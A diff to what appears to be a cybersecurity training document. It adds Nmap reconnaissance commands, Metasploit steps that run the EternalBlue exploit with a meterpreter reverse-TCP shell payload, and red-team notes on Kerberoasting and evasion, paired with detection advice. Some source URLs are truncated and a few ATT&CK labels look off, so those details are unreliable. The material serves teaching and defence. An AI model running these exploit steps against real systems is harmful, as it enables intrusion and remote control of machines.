@@ -267,6 +267,79 @@ In this hands-on segment, you’ll pivot from offensive tradecraft to proactive 
 - [CISA Alert AA22-257A: Threat Hunting for WinRM Abuse](https://www.cisa.gov/uscert/ncas/alerts/aa22-257a)
 - [Elastic Security Labs: Detecting Disabling of Security Tools](https://www.
 
+
+### Essential Commands & Features
+
+#### **Nmap: Advanced Scanning Techniques**
+Beyond basic port scanning, Nmap offers powerful features for service enumeration, OS detection, and scriptable interactions. These commands are critical for **reconnaissance (T1592.004 - Gather Victim Host Information)** and **active scanning (T1595 - Active Scanning)**:
+
+- **Service Version Detection (`-sV`)**
+  Identify running services and versions to pinpoint vulnerable software:
+  ```bash
+  nmap -sV -p 80,443 192.168.1.1
+  ```
+
+- **OS Detection (`-O`)**
+  Fingerprint the target’s OS for tailored exploits:
+  ```bash
+  nmap -O 192.168.1.1
+  ```
+
+- **Aggressive Scan (`-A`)**
+  Combines `-sV`, `-O`, and NSE scripts for comprehensive results:
+  ```bash
+  nmap -A -T4 192.168.1.1
+  ```
+
+- **Nmap Scripting Engine (`--script`)**
+  Run NSE scripts (e.g., `vuln` for vulnerability checks):
+  ```bash
+  nmap --script vuln -p 445 192.168.1.1
+  ```
+
+- **Timing Control (`-T4`)**
+  Speed up scans (aggressive timing, less stealth):
+  ```bash
+  nmap -T4 -p- 192.168.1.1
+  ```
+
+#### **Metasploit: Exploit & Payload Selection**
+Metasploit’s modular framework streamlines exploitation. Key commands for **exploitation (T1210 - Exploitation of Remote Services)**:
+
+- **Search for Exploits**
+  Find exploits by CVE or service:
+  ```bash
+  search type:exploit cve:2021 platform:windows
+  ```
+
+- **Load & Configure Exploits**
+  Use `exploit/` modules and set payloads (e.g., `windows/meterpreter/reverse_tcp`):
+  ```bash
+  use exploit/windows/smb/ms17_010_eternalblue
+  set RHOSTS 192.168.1.1
+  set PAYLOAD windows/x64/meterpreter/reverse_tcp
+  exploit
+  ```
+
+**Sources:**
+- [Nmap Official Documentation: NSE Scripts](https://nmap.org/book/nse.html)
+- [Offensive Security: Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
+
+### Adversary Emulation & Red-Team Perspective
+
+From a red-team perspective, Kali Linux’s offensive tooling enables adversary emulation by replicating real-world attack chains. For example, an attacker may abuse **Kerberoasting (T1558.003)** to extract service account credentials by requesting Kerberos ticket-granting service (TGS) tickets and cracking them offline using Hashcat. This leaves artifacts such as Event ID 4769 (Kerberos service ticket requests) in Windows logs, with high-volume requests for RC4-HMAC encryption—a red flag for defenders.
+
+To evade detection, attackers may:
+- **Schedule tasks (T1053.005)** to execute payloads during off-peak hours, blending with legitimate automation.
+- Use **process hollowing** (a sub-technique of **T1055.012**) to inject malicious code into suspended processes (e.g., `svchost.exe`), avoiding static signature-based detection.
+- Limit Kerberoasting to a few high-value accounts to reduce log noise.
+
+Defenders should monitor for unusual TGS requests, unexpected child processes of `svchost.exe`, and anomalous task scheduler activity. Evasion often relies on living-off-the-land binaries (LOLBins) and minimizing forensic footprints.
+
+**Sources:**
+- [MITRE ATT&CK: Kerberoasting (T1558.003)](https://attack.mitre.org/techniques/T1558/003/)
+- [SpecterOps: Kerberoasting in Practice](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1)
+
 ## Sources
 Claim → source mapping (all URLs are official tool docs, project repos, MITRE ATT&CK, Microsoft Learn, SANS, or Security Onion docs):
 
@@ -334,3 +407,9 @@ Claim → source mapping (all URLs are official tool docs, project repos, MITRE 
 - https://www.
 
 <!-- cyberlab-enriched: v4 -->
+- https://nmap.org/book/nse.html
+- https://www.offensive-security.com/metasploit-unleashed/
+- https://attack.mitre.org/techniques/T1558/003/
+- https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1
+
+<!-- cyberlab-enriched: v5 -->
